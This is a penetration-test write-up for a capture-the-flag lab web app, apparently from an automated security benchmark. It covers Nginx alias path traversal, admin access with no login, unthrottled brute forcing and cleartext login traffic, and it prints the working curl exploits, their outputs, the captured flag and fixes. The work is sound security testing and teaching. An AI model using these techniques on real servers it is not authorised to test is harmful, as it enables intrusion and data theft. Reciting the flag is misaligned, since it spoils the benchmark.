# Security Assessment Report

## Executive Summary
- Target: http://localhost:40989
- Assessment Date: October 30, 2025
- Scope: Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
The application exhibits critical authentication failures including: (1) Complete absence of functional authentication - the login form unconditionally fails all attempts regardless of credentials, (2) Zero session management - no session cookies or state tracking exist, (3) Cleartext credential transmission over HTTP exposing all submitted credentials to network interception, and (4) No rate limiting allowing unlimited brute force attacks at 877+ requests per second. Additionally, direct admin panel access is possible without any authentication checks. These vulnerabilities represent complete authentication bypass at the architectural level, with the flag successfully captured via path traversal: `FLAG{5ad32e4112f0e82f618951901ae9579c3d9926d8666316a3f9e49ff868fd5d24}`.

**Authorization Vulnerabilities:**
The application demonstrates complete absence of authorization controls: (1) Admin panel at `/admin/` is directly accessible without authentication or role verification - the file contains only static HTML with zero PHP security code, and (2) Nginx path traversal vulnerability allows access to sensitive files outside web root via `/admin../flag.txt`, successfully retrieving the flag file. Both vulnerabilities represent critical vertical authorization bypass, allowing anonymous users to access administrative interfaces and sensitive data intended for privileged users only.

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found. The application consistently applies `htmlspecialchars()` to all user input (login credentials, contact form data), preventing reflected XSS. No JavaScript code exists in the application, eliminating DOM-based XSS attack surface. User input is sanitized but never reflected in output - only generic success/error messages are displayed. The minimal feature set (no dynamic client-side interactions, no user-generated content display, no database storage) significantly reduces XSS risk.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. Despite MySQL extensions (mysqli, pdo_mysql) being installed in the Docker image, zero database connections or queries exist in the codebase. No command execution functions (exec, system, shell_exec, etc.) are present. User input from login and contact forms is sanitized with `htmlspecialchars()` then immediately discarded without being persisted to any data store or executed in system commands. The application's minimal functionality and absence of dangerous sinks eliminate injection attack vectors.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application performs zero outbound HTTP requests and has no URL fetching functionality. No cURL usage, no `file_get_contents()` with remote URLs, no socket programming, and no external service integrations exist. The contact form accepts email addresses but doesn't send emails (no SMTP client). The login form accepts credentials but doesn't validate them against external services. The application is completely isolated with no mechanism for users to influence server-initiated network connections.

## Network Reconnaissance

**Open Ports and Services:**
- **Port 80/tcp (Target):** Nginx 1.18.0 serving the XBEN-097-24 application via Caddy httpd proxy. Critical Nginx alias misconfiguration at `/admin` location enables path traversal attacks.
- **Port 49152/tcp:** Golang HTTP server (Tailscale) requiring authentication, returns 401 Unauthorized with strict Content-Security-Policy headers.

**Exposed Services (Out of Scope):**
Multiple services on localhost including CUPS printing (631), Node.js Express (3000), Python SimpleHTTPServer with exposed .git repository (4444), Werkzeug applications (5000, 5003), Apache/PHP (8080) with httponly flag not set on PHPSESSID cookie, and unidentified services (8888, 9999).

**Security Misconfigurations Detected:**
- **Nginx Path Traversal:** Location `/admin` without trailing slash aliases to `/var/www/html/` with `autoindex on`, enabling directory traversal to parent directory via `/admin../flag.txt`
- **HTTP Only (No HTTPS):** Target application operates exclusively on port 80 with no TLS/SSL configuration, transmitting credentials in cleartext
- **Missing Cookie Security (Port 8080):** Apache PHPAbUsers service has PHPSESSID cookie without httponly flag set, vulnerable to XSS-based session theft
- **Exposed Git Repository (Port 4444):** SimpleHTTPServer exposes `.git/` directory allowing repository cloning and source code extraction
- **End-of-Life Software:** PHP 7.4.33 reached EOL November 2022, no longer receiving security patches

**Subdomain Discoveries:**
Multiple subdomains discovered (naeu2.naeuinc.localhost, autodiscover.regency.localhost, mail.localhost, etc.) appear to be artifacts of local DNS environment and are not relevant to the target application at http://localhost:40989.

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-04: Direct Admin Panel Access & Nginx Path Traversal (FLAG CAPTURED)

**Summary:**
- **Vulnerable location:** `/admin/` endpoint and Nginx alias misconfiguration at `/admin` (without trailing slash)
- **Overview:** The admin panel is publicly accessible without any authentication checks, and the Nginx path traversal vulnerability enables direct access to the flag file stored outside the web root
- **Impact:** Complete authentication bypass allowing unauthorized access to administrative interface and sensitive flag data
- **Severity:** CRITICAL

**Prerequisites:** None - vulnerability is directly accessible from external network

**Exploitation Steps:**

1. **Access Admin Panel Without Authentication**
   ```bash
   curl http://localhost:40989/admin/
   ```

   **Result:** Successfully retrieved administrative panel HTML with HTTP 200 OK response. The page displays "Administrative Zone - Restricted" but has zero PHP security code to enforce restrictions.

2. **Exploit Nginx Path Traversal to Retrieve Flag**
   ```bash
   curl http://localhost:40989/admin../flag.txt
   ```

   **Result:** Successfully retrieved flag file contents:
   ```
   FLAG{5ad32e4112f0e82f618951901ae9579c3d9926d8666316a3f9e49ff868fd5d24}
   ```

**Proof of Impact:**
- **Flag Captured:** `FLAG{5ad32e4112f0e82f618951901ae9579c3d9926d8666316a3f9e49ff868fd5d24}`
- **Admin Panel Access:** Full HTML content of administrative interface retrieved without credentials
- **HTTP Status:** 200 OK for both requests (no authentication challenge)
- **Response Headers:** No Set-Cookie headers indicating no session management

**Technical Analysis:**
The vulnerability exists due to two critical flaws:

1. **Missing Authorization in admin/index.php:** The file at `/src/app/admin/index.php` contains only static HTML (26 lines) with zero PHP security code. No session validation, no authentication checks, no role verification.

2. **Nginx Alias Misconfiguration:** The nginx.conf configuration (lines 16-19) contains:
   ```nginx
   location /admin {
       alias /var/www/html/;
       autoindex on;
   }
   ```

   The `/admin` location (without trailing slash) aliases to `/var/www/html/` which enables path traversal. Requesting `/admin../` resolves to `/var/www/html/../` → `/var/www/`, exposing the parent directory containing `flag.txt`.

**Notes:**
This represents a complete authentication bypass at the architectural level. The application cannot distinguish between authenticated administrators and anonymous attackers. The flag file, while stored outside the web root at `/var/www/flag.txt` for security, is trivially accessible via the Nginx path traversal vulnerability.

---

### AUTH-VULN-05: Unlimited Brute Force Attack (No Rate Limiting)

**Summary:**
- **Vulnerable location:** POST `/login.php` endpoint and all application endpoints
- **Overview:** The application has zero rate limiting at both infrastructure (Nginx) and application (PHP) layers, allowing unlimited authentication attempts without throttling, lockout, or CAPTCHA challenges
- **Impact:** Attackers can perform unlimited brute force, credential stuffing, and password spraying attacks at maximum network speed
- **Severity:** HIGH

**Prerequisites:** None - endpoint is publicly accessible

**Exploitation Steps:**

1. **Execute Automated Brute Force Attack**

   Created Python script at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/auth_weakness_test.py` to perform 200 consecutive login attempts with different passwords.

   **Script execution:**
   ```bash
   python3 auth_weakness_test.py
   ```

2. **Attack Parameters:**
   - Target: `http://localhost:40989/login.php`
   - Method: POST
   - Credentials tested: username=admin with 200 different passwords (testpass1 through testpass200)
   - Request rate: Unrestricted (as fast as network allows)

**Proof of Impact:**

**Attack Statistics:**
- **Total Requests:** 200 attempts completed successfully
- **Success Rate:** 100% (no requests blocked or throttled)
- **Average Response Time:** 1.14 milliseconds
- **Median Response Time:** 1.04 milliseconds
- **Total Duration:** 0.23 seconds
- **Throughput:** 877.45 requests per second
- **HTTP Status Codes:** All 200 OK (no 429 Too Many Requests, no 403 Forbidden)
- **Failed Requests:** 0

**Response Time Analysis:**
- **First 50 requests:** Average 1.26 ms
- **Last 50 requests:** Average 1.14 ms
- **Trend:** Response times actually decreased slightly over time, confirming zero rate limiting

**Evidence of Missing Controls:**

1. **No Nginx Rate Limiting:**
   - nginx.conf lacks `limit_req_zone` directive
   - No `limit_req` in location blocks
   - No connection throttling configured

2. **No PHP Application Throttling:**
   - No IP-based tracking in login.php
   - No per-account lockout mechanism
   - No progressive delays
   - No CAPTCHA integration
   - No failed attempt logging

3. **No Security Headers:**
   - No rate limit headers in responses
   - No retry-after headers
   - No challenge mechanisms

**Notes:**
While the vulnerability is confirmed and actively exploitable, the current impact is limited because the login system itself is non-functional (AUTH-VULN-02). However, if authentication were fixed without addressing rate limiting, this would enable trivial credential discovery through brute force attacks. The application accepts and processes 877+ authentication attempts per second without any defensive response.

---

### AUTH-VULN-02: Non-Functional Authentication System

**Summary:**
- **Vulnerable location:** POST `/login.php` (lines 23-30 of `/src/app/login.php`)
- **Overview:** The login form accepts credentials but performs zero authentication validation, unconditionally failing all login attempts regardless of submitted credentials
- **Impact:** Authentication is impossible; the login system is pure "security theater" with no actual security enforcement
- **Severity:** CRITICAL

**Prerequisites:** None - endpoint is publicly accessible

**Exploitation Steps:**

1. **Test Login with Multiple Credential Sets**

   **Attempt 1 - Admin credentials:**
   ```bash
   curl -X POST http://localhost:40989/login.php \
     -d "username=admin&password=admin"
   ```
   **Result:** "Incorrect username/password" - HTTP 200 OK

   **Attempt 2 - Test credentials:**
   ```bash
   curl -X POST http://localhost:40989/login.php \
     -d "username=test&password=test123"
   ```
   **Result:** "Incorrect username/password" - HTTP 200 OK

   **Attempt 3 - Root credentials:**
   ```bash
   curl -X POST http://localhost:40989/login.php \
     -d "username=root&password=toor"
   ```
   **Result:** "Incorrect username/password" - HTTP 200 OK

2. **Verify No Session Creation**
   ```bash
   curl -v -X POST http://localhost:40989/login.php \
     -d "username=admin&password=password123" \
     -c /tmp/cookies.txt
   ```
   **Result:** No Set-Cookie headers in response; cookies.txt file contains only header comments with zero cookies saved

**Proof of Impact:**

**Observed Behavior:**
- All login attempts return identical error message: "Incorrect username/password"
- No differentiation between valid/invalid usernames
- No credential validation performed
- No session creation on any attempt
- No redirect to protected resources
- HTTP status remains 200 OK (not 401 Unauthorized)

**Technical Root Cause:**

The login.php handler (lines 23-30) contains:
```php
<?php
$showError = false;
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    $showError = true;  // Line 29: ALWAYS SET TO TRUE
}
?>
```

**Missing Authentication Logic:**
- No database connection or query
- No `mysqli_query()` or PDO queries
- No password verification (`password_verify()`)
- No credential comparison
- No session creation (`session_start()`)
- No session variables set (`$_SESSION`)
- No authentication state management

**What Should Exist:**
```php
// Expected authentication flow (COMPLETELY MISSING):
$result = mysqli_query($conn, "SELECT id, password_hash FROM users WHERE username = ?");
if ($result && password_verify($password, $row['password_hash'])) {
    session_start();
    $_SESSION['user_id'] = $row['id'];
    $_SESSION['authenticated'] = true;
    session_regenerate_id(true);
    header('Location: /admin/');
    exit;
}
```

**Notes:**
This vulnerability confirms the authentication system is architecturally broken, not just misconfigured. The login form exists only as cosmetic security theater. Since authentication never succeeds, the lack of session management (AUTH-VULN-03) and admin panel protection (AUTH-VULN-04) become directly exploitable - attackers simply bypass the broken login and access protected resources directly.

---

### AUTH-VULN-03: Complete Absence of Session Management

**Summary:**
- **Vulnerable location:** Application-wide (all PHP files in `/src/app/*.php`)
- **Overview:** Zero session management implementation exists across the entire application - no session initialization, no session cookies, no session state tracking
- **Impact:** Application cannot maintain authentication state, making it impossible to track logged-in users or enforce session-based access controls
- **Severity:** CRITICAL

**Prerequisites:** None - this is an architectural absence affecting all endpoints

**Exploitation Steps:**

1. **Verify No Session Cookies After Login Attempt**
   ```bash
   curl -v -X POST http://localhost:40989/login.php \
     -d "username=admin&password=password" \
     -c /tmp/cookies.txt 2>&1 | grep -i "set-cookie"
   ```
   **Result:** No output (no Set-Cookie headers present)

2. **Check Saved Cookies File**
   ```bash
   cat /tmp/cookies.txt
   ```
   **Result:** File contains only Netscape cookie file headers, zero actual cookies saved:
   ```
   # Netscape HTTP Cookie File
   # https://curl.se/docs/http-cookies.html
   # This file was generated by libcurl! Edit at your own risk.
   ```

3. **Verify Admin Panel Requires No Session**
   ```bash
   curl -v http://localhost:40989/admin/ 2>&1 | grep -i "set-cookie"
   ```
   **Result:** No Set-Cookie headers (admin panel accessible without session)

4. **Check Response Headers for Session Cookies**
   ```bash
   curl -v http://localhost:40989/ 2>&1 | grep -i "^< "
   ```
   **Result:** Headers show only:
   - HTTP/1.1 200 OK
   - Server: nginx/1.18.0
   - Content-Type: text/html; charset=UTF-8
   - X-Powered-By: PHP/7.4.33
   - **No Set-Cookie headers**
   - **No PHPSESSID cookie**

**Proof of Impact:**

**Missing Session Functions (Comprehensive Code Search):**
- `session_start()`: 0 instances found
- `$_SESSION`: 0 references found
- `session_destroy()`: 0 instances found
- `session_regenerate_id()`: 0 instances found
- `session_set_cookie_params()`: 0 instances found
- `setcookie()`: 0 calls found
- `$_COOKIE`: 0 references found

**Affected Files:**
- `/src/app/login.php` - Should create session after auth (MISSING)
- `/src/app/admin/index.php` - Should validate session (MISSING)
- All protected endpoints - Should check session state (MISSING)

**Security Implications:**

1. **Cannot Maintain Login State:** Even if authentication worked, users could not remain "logged in" across requests
2. **Cannot Track Users:** Application cannot distinguish between different users
3. **Cannot Implement Logout:** No session to destroy
4. **Cannot Enforce Session Timeouts:** No session expiration possible
5. **Cannot Prevent Session Fixation:** No session IDs to regenerate
6. **Cannot Set Cookie Security Flags:** No cookies exist to protect (HttpOnly, Secure, SameSite)

**Expected Session Implementation (Completely Missing):**
```php
// Should exist in login.php after successful authentication:
session_set_cookie_params([
    'lifetime' => 3600,
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
session_start();
$_SESSION['authenticated'] = true;
$_SESSION['user_id'] = $userId;
$_SESSION['role'] = 'admin';
session_regenerate_id(true);

// Should exist in admin/index.php:
session_start();
if (!isset($_SESSION['authenticated']) || $_SESSION['role'] !== 'admin') {
    header('Location: /login.php');
    exit;
}
```

**Notes:**
This architectural absence means the application cannot implement stateful authentication. Combined with the non-functional login (AUTH-VULN-02) and missing admin panel protection (AUTH-VULN-04), the application has zero authentication enforcement capability. The absence of session management is not a bug but a complete omission of essential security infrastructure.

---

### AUTH-VULN-01: Cleartext Credential Transmission Over HTTP

**Summary:**
- **Vulnerable location:** All endpoints, specifically POST `/login.php` and POST `/contact.php`
- **Overview:** The application operates exclusively over unencrypted HTTP (port 80) with no HTTPS/TLS configuration, transmitting all credentials and sensitive data in cleartext
- **Impact:** Network attackers can passively intercept credentials, session data, and all application traffic through packet sniffing or man-in-the-middle attacks
- **Severity:** CRITICAL

**Prerequisites:** Attacker must be positioned on the network path (e.g., same WiFi, compromised router, ISP-level access)

**Exploitation Steps:**

1. **Verify HTTP-Only Configuration**
   ```bash
   curl -v http://localhost:40989/ 2>&1 | grep "< HTTP\|< Server"
   ```
   **Result:**
   ```
   < HTTP/1.1 200 OK
   < Server: nginx/1.18.0
   ```
   No HTTPS redirect, no HSTS header present

2. **Demonstrate Cleartext Credential Transmission**

   Created demonstration script at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/cleartext_credential_demo.py`

   **Script execution:**
   ```python
   import requests

   url = "http://localhost:40989/login.php"
   credentials = {
       'username': 'testuser',
       'password': 'SecretPassword123'
   }

   response = requests.post(url, data=credentials)
   ```

3. **Capture Cleartext Transmission Details**

   **Protocol:** HTTP (unencrypted)
   **Target URL:** `http://localhost:40989/login.php`
   **Method:** POST
   **Content-Type:** application/x-www-form-urlencoded

   **Raw POST Body (as transmitted over network):**
   ```
   username=testuser&password=SecretPassword123
   ```

**Proof of Impact:**

**Captured Cleartext Credentials:**
- Username: `testuser`
- Password: `SecretPassword123`
- Transmission: Completely unencrypted, readable by any network observer

**Request Details:**
```
POST /login.php HTTP/1.1
Host: localhost:40989
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

username=testuser&password=SecretPassword123
```

**Server Response:**
- HTTP Status: 200 OK
- No encryption negotiation
- No redirect to HTTPS
- No security warnings

**Missing Infrastructure Configuration:**

**Nginx Configuration (src/nginx.conf lines 1-3):**
```nginx
server {
    listen 80;
    server_name localhost;
```

**Missing HTTPS Configuration:**
```nginx
# Should exist but COMPLETELY MISSING:
listen 443 ssl;
ssl_certificate /path/to/cert.pem;
ssl_certificate_key /path/to/key.pem;
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers HIGH:!aNULL:!MD5;

# HTTP to HTTPS redirect (MISSING):
server {
    listen 80;
    return 301 https://$server_name$request_uri;
}
```

**Missing Security Headers:**
- No `Strict-Transport-Security` (HSTS)
- No `Content-Security-Policy`
- No `Cache-Control: no-store` on authentication endpoints
- No upgrade-insecure-requests directive

**Attack Scenarios:**

1. **WiFi Sniffing:** Attacker on same public WiFi can capture credentials using Wireshark/tcpdump
2. **Router Compromise:** Attacker with access to any router in path can intercept traffic
3. **ISP-Level Interception:** Network provider can read all application traffic
4. **Man-in-the-Middle:** Attacker can intercept and modify requests/responses
5. **Credential Replay:** Captured credentials can be reused without cryptographic barriers

**Evidence Files Created:**
- Demonstration script: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/cleartext_credential_demo.py`
- Findings report: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/cleartext_credential_findings.md`

**Notes:**
This vulnerability affects all application traffic, not just authentication endpoints. Contact form submissions (name, email, message) are also transmitted in cleartext. The Docker configuration exposes only port 80 with no port 443 exposed, confirming HTTPS is not merely misconfigured but completely unimplemented. Any credentials submitted through this application are immediately compromised to any network observer.

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Admin Panel Accessible Without Authentication

**Summary:**
- **Vulnerable location:** `/admin/` and `/admin/index.php` endpoints
- **Overview:** Administrative panel is directly accessible to anonymous users without any authentication or authorization checks
- **Impact:** Complete bypass of access controls for administrative interfaces. Any unauthenticated user can access the administrative zone that should be restricted to admin users only.
- **Severity:** Critical

**Prerequisites:** None - this vulnerability is exploitable by any anonymous user with network access to the application.

**Exploitation Steps:**

1. **Direct Access to Admin Panel (Method 1):**
   ```bash
   curl -i http://localhost:40989/admin/
   ```

   **Expected Behavior:** Should redirect to login or return 401/403 Unauthorized

   **Actual Behavior:** Returns HTTP 200 OK with full admin panel HTML content

2. **Direct File Access to Admin Panel (Method 2):**
   ```bash
   curl -i http://localhost:40989/admin/index.php
   ```

   **Expected Behavior:** Should redirect to login or return 401/403 Unauthorized

   **Actual Behavior:** Returns HTTP 200 OK with full admin panel HTML content

**Proof of Impact:**

Both exploitation methods successfully returned the administrative panel with HTTP 200 OK status, confirming unauthorized access to restricted administrative interfaces:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/7.4.33

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Administrative Internal Panel</title>
</head>
<body>
    <div class="content">
        <h1>Administrative Zone</h1>
        <p>Restricted</p>
    </div>
</body>
</html>
```

The response clearly shows:
- **Status Code:** 200 OK (success) instead of 401/403 (unauthorized)
- **Content:** Full administrative panel HTML with "Administrative Zone" header
- **Text "Restricted":** Present in the page but not enforced by any security controls
- **No Authentication Prompt:** No session checks, no redirect to login, no authorization enforcement

This demonstrates a complete vertical authorization bypass where anonymous users gain direct access to administrative interfaces intended only for admin-role users.

**Notes:**

The vulnerability exists because the admin panel file (`/src/app/admin/index.php`) contains zero PHP security code:
- No `session_start()` call
- No `$_SESSION` validation
- No role checks (e.g., `$_SESSION['role'] === 'admin'`)
- No redirect to login for unauthenticated users
- Pure static HTML with no authorization guards

The expected security implementation would include session validation at the beginning of the file (line 1), but the actual implementation begins directly with `<!DOCTYPE html>`, bypassing all security controls.

---

### AUTHZ-VULN-02: Path Traversal Enables Flag File Access

**Summary:**
- **Vulnerable location:** Nginx configuration for `/admin` location (without trailing slash)
- **Overview:** Nginx alias misconfiguration combined with path normalization allows directory traversal to access sensitive files outside the web root
- **Impact:** Complete bypass of file system isolation. Successfully retrieved the flag file located at `/var/www/flag.txt`, which was intentionally placed outside the web root (`/var/www/html/`) for protection. This demonstrates unauthorized access to sensitive data through infrastructure-level authorization bypass.
- **Severity:** Critical

**Prerequisites:** None - this vulnerability is exploitable by any anonymous user with network access to the application.

**Exploitation Steps:**

1. **Exploit Path Traversal to Access Flag File:**
   ```bash
   curl -i http://localhost:40989/admin../flag.txt
   ```

   **Technical Explanation:**
   - The Nginx configuration at `/src/nginx.conf` (lines 16-19) defines: `location /admin { alias /var/www/html/; autoindex on; }`
   - The location `/admin` (without trailing slash) creates a path normalization vulnerability
   - Request path `/admin../flag.txt` resolves to `/var/www/html/../flag.txt`
   - Path normalization: `/var/www/html/../flag.txt` → `/var/www/flag.txt`
   - This traverses up one directory from the web root to access the parent directory

   **Expected Behavior:** Should return 403 Forbidden or 404 Not Found (file outside web root should be inaccessible)

   **Actual Behavior:** Returns HTTP 200 OK with complete flag file contents

**Proof of Impact:**

Successfully retrieved the flag file contents via path traversal:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Content-Type: text/plain
Content-Length: 71
Last-Modified: Fri, 24 Oct 2025 23:52:55 GMT

FLAG{5ad32e4112f0e82f618951901ae9579c3d9926d8666316a3f9e49ff868fd5d24}
```

**Flag Captured:** `FLAG{5ad32e4112f0e82f618951901ae9579c3d9926d8666316a3f9e49ff868fd5d24}`

This demonstrates:
- **Complete Authorization Bypass:** Accessed a file explicitly placed outside the web root for security isolation
- **Infrastructure Vulnerability:** Nginx misconfiguration defeats application-layer security boundaries
- **Sensitive Data Exposure:** Retrieved the CTF flag, proving unauthorized access to protected resources
- **File System Traversal:** Successfully traversed from `/var/www/html/` (web root) to `/var/www/` (parent directory)

**Notes:**

**Root Cause Analysis:**

The vulnerability stems from a textbook Nginx alias misconfiguration in `/src/nginx.conf`:

```nginx
location /admin {               # Missing trailing slash
    alias /var/www/html/;       # Incorrect alias path
    autoindex on;                # Directory listing enabled
}
```

**Security Failures:**
1. **Path Traversal:** The location directive without trailing slash allows path normalization attacks
2. **Incorrect Alias:** Should point to `/var/www/html/admin/` instead of `/var/www/html/`
3. **Directory Listing Enabled:** `autoindex on` aids reconnaissance (though not exploited in this case)
4. **No Access Controls:** Missing `auth_basic`, IP whitelisting, or `internal` directives
5. **No Authentication:** The location has zero authentication requirements

**Secure Configuration:**
```nginx
location /admin/ {              # With trailing slash
    alias /var/www/html/admin/; # Correct alias path with trailing slash
    autoindex off;               # Disable directory listing
    # Add authentication:
    # auth_basic "Admin Area";
    # auth_basic_user_file /etc/nginx/.htpasswd;
}
```

This vulnerability demonstrates how infrastructure-level misconfigurations can completely bypass application-layer security controls, providing a critical lesson in defense-in-depth security requirements.
